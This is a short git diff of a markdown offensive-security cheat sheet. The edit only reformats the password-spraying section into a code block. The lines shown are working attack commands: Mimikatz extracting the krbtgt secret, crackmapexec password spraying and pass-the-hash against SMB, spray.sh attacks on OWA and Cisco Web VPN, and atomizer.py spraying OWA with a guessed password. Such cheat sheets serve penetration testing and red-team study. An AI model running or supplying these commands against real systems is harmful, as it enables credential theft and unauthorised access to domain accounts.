@@ -42,8 +42,9 @@
 |Invoke-Mimikatz -Command '"lsadump::lsa /inject /name:krbtgt"'|
 ```
 
-|  Password Spraying Attack |
-| ------------- |
+ ### Password Spraying Attack 
+```
+
 | crackmapexec smb 192.168.1.1  -d ninja.corp -u MeME -P /usr/share/wordlists/rockyou.txt|
 | smbclient -N -L \\\\10.10.10.103 | grep Disk | sed 's/^\s*\(.*\)\s*Disk.*/\1/' |
 | crackmapexec smb 192.168.1.1 -u MeMe -H NTHASH |
@@ -52,7 +53,7 @@
 |spray.sh -owa 192.168.1.1 users.txt  /usr/share/wordlists/rockyou.txt   1 35 Request.body #OWA|
 |spray.sh -ciso 192.168.1.1 usernames.txt /usr/share/wordlists/rockyou.txt 1 35 #CISCO Web VPN|
 |./atomizer.py owa contoso.com 'Fall2018' emails.txt|
-
+```
 
 Then use `mimikatz` to load the ticket.
 
